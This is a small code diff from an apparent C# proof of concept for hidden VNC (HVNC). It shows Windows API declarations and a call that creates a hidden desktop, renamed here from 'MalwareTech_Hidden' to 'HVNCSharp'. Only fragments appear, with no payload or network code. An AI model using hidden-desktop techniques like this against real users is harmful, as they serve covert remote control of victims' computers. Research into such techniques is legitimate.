@@ -30,7 +30,7 @@ namespace Poc
         [DllImport("user32.dll", SetLastError = true)]
         private static extern bool SwitchDesktop(IntPtr hDesktop);
 
-        [DllImport("kernel32.dll", SetLastError = true)] // Flyttad till kernel32.dll
+        [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool CloseHandle(IntPtr hObject);
 
         [DllImport("user32.dll")]
@@ -168,7 +168,7 @@ namespace Poc
         static void Main(string[] args)
         {
             IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
-            IntPtr hiddenDesktop = CreateHiddenDesktop("MalwareTech_Hidden");
+            IntPtr hiddenDesktop = CreateHiddenDesktop("HVNCSharp");
 
             if (hiddenDesktop == IntPtr.Zero)
             {
